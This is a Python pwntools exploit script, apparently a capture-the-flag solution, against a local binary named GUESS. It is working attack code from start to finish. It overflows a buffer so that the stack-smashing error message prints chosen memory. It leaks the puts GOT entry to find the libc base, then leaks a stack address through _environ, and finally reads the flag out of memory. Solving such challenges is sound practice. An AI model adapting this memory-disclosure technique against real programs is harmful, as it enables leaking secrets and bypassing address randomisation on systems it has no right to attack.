#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = process('./GUESS')
elf = ELF('./GUESS')

offset = 0x128
puts_got = elf.got['puts']


###leak libc###
payload = 'A' * offset + p64(puts_got)
p.recvuntil('Please type your guessing flag\n')
p.sendline(payload)

p.recvuntil('*** stack smashing detected ***:')
puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
log.success('libc base:'+hex(libc_base))


###leak stack###
environ = libc_base + libc.dump('_environ')
log.success('_environ:'+hex(environ))

payload = 'A' * offset + p64(environ)
p.recvuntil('Please type your guessing flag\n')
p.sendline(payload)

stack = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.success('stack:'+hex(stack))

###leak flag###

flag = stack - 0x168
payload = 'A' * offset + p64(flag)
p.recvuntil('Please type your guessing flag\n')
p.sendline(payload)

p.interactive()
